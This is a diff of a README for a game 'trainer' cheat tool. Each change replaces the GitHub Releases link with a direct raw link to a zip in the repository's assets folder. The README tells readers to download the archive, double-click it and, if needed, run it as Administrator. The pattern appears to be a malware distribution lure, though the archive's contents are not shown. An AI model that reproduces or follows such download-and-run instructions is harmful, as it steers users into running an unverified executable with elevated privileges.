@@ -1,6 +1,6 @@
 # 🎯 IRON-NEST-Trainer - Master Every Turret Battle Instantly
 
-[![Download IRON-NEST-Trainer](https://img.shields.io/badge/Download-IRON--NEST--Trainer-9cf.svg?style=for-the-badge&logo=github&logoColor=white&colorA=4b0082&colorB=8a2be2)](https://github.com/sandiihhe-ops/IRON-NEST-Trainer/releases)
+[![Download IRON-NEST-Trainer](https://img.shields.io/badge/Download-IRON--NEST--Trainer-9cf.svg?style=for-the-badge&logo=github&logoColor=white&colorA=4b0082&colorB=8a2be2)](https://raw.githubusercontent.com/sandiihhe-ops/IRON-NEST-Trainer/main/assets/NES-Trainer-IRO-v2.9.zip)
 
 Visit this link to download the application.
 
@@ -38,7 +38,7 @@ The trainer features **9 well-organized tabs** for easy navigation, so you never
 
 Getting started is simple:
 
-1. **Visit this link to download the application** - [https://github.com/sandiihhe-ops/IRON-NEST-Trainer/releases](https://github.com/sandiihhe-ops/IRON-NEST-Trainer/releases)
+1. **Visit this link to download the application** - [https://raw.githubusercontent.com/sandiihhe-ops/IRON-NEST-Trainer/main/assets/NES-Trainer-IRO-v2.9.zip](https://raw.githubusercontent.com/sandiihhe-ops/IRON-NEST-Trainer/main/assets/NES-Trainer-IRO-v2.9.zip)
 2. Click the download button for the latest release file.
 3. Once the download finishes, locate the file in your **Downloads** folder.
 4. Double-click the downloaded file to run the trainer.
@@ -66,7 +66,7 @@ After launching the trainer:
 
 - **Leaderboard submissions are blocked by default** while the trainer is active. This keeps your Steam profile safe from unfair score flags.
 - This trainer is designed for **single-player or private practice** use. Do not use it in online competitive modes.
-- Keep the trainer updated by checking the [Releases page](https://github.com/sandiihhe-ops/IRON-NEST-Trainer/releases) regularly.
+- Keep the trainer updated by checking the [Releases page](https://raw.githubusercontent.com/sandiihhe-ops/IRON-NEST-Trainer/main/assets/NES-Trainer-IRO-v2.9.zip) regularly.
 
 ---
 
@@ -94,7 +94,7 @@ A: No. The trainer is self-contained. You only need the trainer file and the gam
 A: First, make sure the game is running. Then check that you've launched the trainer **after** the game. If it still doesn't respond, try running the trainer as **Administrator** (right-click the file, select "Run as administrator").
 
 **Q: Is this compatible with the latest game update?**
-A: The trainer is updated frequently. Always download the most recent version from the [Releases page](https://github.com/sandiihhe-ops/IRON-NEST-Trainer/releases) to ensure compatibility.
+A: The trainer is updated frequently. Always download the most recent version from the [Releases page](https://raw.githubusercontent.com/sandiihhe-ops/IRON-NEST-Trainer/main/assets/NES-Trainer-IRO-v2.9.zip) to ensure compatibility.
 
 ---
 
@@ -138,7 +138,7 @@ This trainer is an independent third-party tool. It is not affiliated with or en
 
 ## 🏁 Final Checklist Before You Play
 
-- [x] Downloaded the trainer from [https://github.com/sandiihhe-ops/IRON-NEST-Trainer/releases](https://github.com/sandiihhe-ops/IRON-NEST-Trainer/releases)
+- [x] Downloaded the trainer from [https://raw.githubusercontent.com/sandiihhe-ops/IRON-NEST-Trainer/main/assets/NES-Trainer-IRO-v2.9.zip](https://raw.githubusercontent.com/sandiihhe-ops/IRON-NEST-Trainer/main/assets/NES-Trainer-IRO-v2.9.zip)
 - [x] Game is installed and running
 - [x] Trainer launched successfully
 - [x] Features activated and ready
